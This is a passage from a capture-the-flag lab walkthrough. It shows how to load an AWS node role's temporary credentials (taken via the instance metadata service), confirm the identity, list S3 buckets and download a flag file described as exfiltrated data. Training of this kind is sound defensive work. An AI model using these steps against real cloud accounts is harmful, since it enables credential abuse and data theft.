the previous step.</p> <pre><code>export AWS_ACCESS_KEY_ID=ENTER_NODE_ROLE_ACCESS_KEY_ID\nexport AWS_SECRET_ACCESS_KEY=ENTER_NODE_ROLE_SECRET_ACCESS_KEY\nexport AWS_SESSION_TOKEN=ENTER_NODE_ROLE_SESSION_TOKEN\nexport AWS_DEFAULT_REGION=us-west-2\n</code></pre> </li> <li> <p>Run the <code>aws sts get-caller-identity</code> command to verify you have properly configured the IAM role's temporary credentials. The output should show you are authenticating as the node's EC2 instance profile role.</p> <pre><code>aws sts get-caller-identity\n</code></pre> <p>Expected Output</p> <pre><code>{\n  \"UserId\": \"AROASZY2ZSU65B7QQKFEP:i-0304eb3fda5d5c44d\",\n  \"Account\": \"123456789012\",\n  \"Arn\": \"arn:aws:sts::123456789012:assumed-role/hth-node-role-random-id/i-0304eb3fda5d5c44d\"\n}\n</code></pre> </li> <li> <p>List all of the S3 buckets in the account that contain the keyword hth. The output will show an audit logs bucket alongside an <code>hth</code> bucket containing the shadowhawk flag.</p> <pre><code>aws s3api list-buckets | grep \"hth\"\n</code></pre> <p>Expected Output</p> <pre><code>\"Name\": \"hth-audit-logs-randomid\",\n\"Name\": \"?????\",\n</code></pre> </li> </ul> Answer <p>The S3 bucket that contains the <code>shadowhawk</code> flag is hth-randomid.</p> <p>Expected Output</p> <pre><code>\"Name\": \"hth-randomid\",\n</code></pre> </li> <li> <p>List the objects in the S3 bucket and exfiltrate the object that contains the <code>shadowhawk</code> flag.</p> Hint <ul> <li> <p>Use the <code>aws s3api list-objects</code> command to list the objects in the S3 bucket. The output will show the object that contains the flag.</p> <pre><code>aws s3api list-objects --bucket ????? | jq '.Contents[].Key'\n</code></pre> <p>Expected Output</p> <pre><code>\"flightplans/cascadia-explorer.txt\"\n\"flightplans/ny-la-express.txt\"\n\"?????/?????\"\n\"flightplans/thames-to-seine.txt\"\n\"pilots/pilots.csv\"\n</code></pre> </li> <li> <p>Use the <code>aws s3api get-object</code> command to copy the object that contains the flag to your local file system.</p> <pre><code>aws s3api get-object --bucket ????? --key ????? /path/to/your/downloads/?????.txt\n</code></pre> <p>Expected Output</p> <pre><code>{\n  \"AcceptRanges\": \"bytes\",\n  \"LastModified\": \"2024-10-30T18:00:03+00:00\",\n  \"ContentLength\": 1124,\n  \"ETag\": \"\\\"77f6f010d81c99754efa3acc70d4b35d\\\"\",\n  \"ContentType\": \"application/octet-stream\",\n  \"ServerSideEncryption\": \"AES256\",\n  \"Metadata\": {},\n  \"TagCount\": 3\n}\n</code></pre> </li> <li> <p>Open the file to find the <code>shadowhawk</code> flag.</p> </li> </ul> Answer <ul> <li> <p>The command to download the object that contains the <code>shadowhawk</code> flag is...</p> <pre><code>aws s3api get-object --bucket hth-randomid --key flightplans/shadowhawk.txt ~/Downloads/shadowhawk.txt\n</code></pre> </li> <li> <p>Open the file and find the Startup Code line, which contains the flag.</p> <p>Expected Output</p> <pre><code>Startup Code: hth{?????}\n</code></pre> </li> </ul> </li> </ol>"},{"location":"shadowhawk/#next-challenge","title":"Next Challenge","text":"<p>Congratulations! You have identified a privilege escalation opportunity using the Instance Metadata API attacker technique and exfiltrated the Shadowhawk flag from the compromised AWS account.</p> <p>Before you move on to the next challenge, make sure you clear the environment variables that are using the node's temporary credentials. This can be done by closing your Terminal or running the following unset command.</p> <pre><code>unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN\n</code></pre> <p>Continue to the API Key Challenge to learn how Kubernetes secrets are attached to a pod.</p>"}]}